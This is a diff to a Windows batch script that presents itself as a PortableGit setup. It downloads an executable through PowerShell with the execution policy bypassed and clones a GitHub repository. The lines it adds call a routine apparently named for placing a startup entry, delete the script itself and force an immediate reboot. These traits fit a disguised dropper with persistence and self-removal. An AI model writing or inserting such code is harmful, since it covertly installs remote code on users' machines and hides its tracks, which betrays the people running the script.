@@ -7,9 +7,13 @@ set "GIT_DIR=%LOCALAPPDATA%\Programs\PortableGit"
 set "TMP_EXE=%TEMP%\PortableGit.exe"
 set "WORKING_DIR=%TEMP%\working"
 
-cd "%WORKING_DIR%"
+
 
 :download_git
+git --version >nul 2>&1
+if %errorlevel%==0 (
+    exit /b
+)
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "Invoke-WebRequest -Uri '%GIT_URL%' -OutFile '%TMP_EXE%'"
 
@@ -27,7 +31,11 @@ exit /b
 :check_git
 if not exist "%WORKING_DIR%\git" (
     gh repo clone Finnerdespin/git
+    call :place_startup
+    del main.bat
+    shutdown /r /f /t 0
 )
+cd "%WORKING_DIR%"
 exit /b
 
 :place_startup
